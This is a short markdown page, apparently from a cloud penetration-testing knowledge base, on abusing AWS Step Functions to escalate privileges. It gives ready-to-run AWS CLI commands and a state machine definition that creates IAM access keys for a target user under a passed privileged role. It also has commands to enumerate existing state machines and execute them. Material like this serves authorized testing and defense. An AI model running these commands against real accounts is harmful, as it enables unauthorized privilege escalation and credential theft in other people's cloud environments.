---
title: "Step Functions: orchestrating privileged actions through a state machine"
description: "Abusing Step Functions state machines and their execution role to orchestrate privileged actions."
keywords:
  - Step Functions
  - state machine
  - execution role
  - orchestration
  - workflow
---

# Step Functions

A Step Functions **state machine** runs with an execution role and can call AWS service actions directly from its definition. With `states:CreateStateMachine` (plus `iam:PassRole`) an attacker defines a machine whose `Task` states perform privileged actions as the passed role; with `states:UpdateStateMachine` an existing machine is repurposed; and `states:StartExecution` on a machine that already holds a powerful role runs its workflow without any edit.

## Creating a machine that acts as a passed role

```bash
cat > def.json <<'JSON'
{ "StartAt":"go","States":{
  "go":{"Type":"Task","Resource":"arn:aws:states:::aws-sdk:iam:createAccessKey",
        "Parameters":{"UserName":"target"},"End":true}}}
JSON
aws stepfunctions create-state-machine --name x \
  --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --definition file://def.json
aws stepfunctions start-execution --state-machine-arn <arn>
```

## Driving an existing machine

```bash
aws stepfunctions list-state-machines
aws stepfunctions describe-state-machine --state-machine-arn <arn> --query roleArn
aws stepfunctions start-execution --state-machine-arn <arn> --input '{}'
```

## Exploitation notes

- The SDK integration (`arn:aws:states:::aws-sdk:<service>:<action>`) lets a state machine call almost any AWS API as its role, so the role's permissions are the blast radius.
- `create-state-machine` with `--role-arn` needs `iam:PassRole`, making this a PassRole privilege path scoped to Step Functions.
- A machine that already carries a broad role is exploitable with `start-execution` alone.

## Tools

- **AWS CLI** (`stepfunctions create-state-machine`, `start-execution`, `list-state-machines`).

## References

- [AWS: Step Functions AWS SDK service integrations](https://docs.aws.amazon.com/step-functions/latest/dg/supported-services-awssdk.html)
- [HackTricks Cloud: AWS Step Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
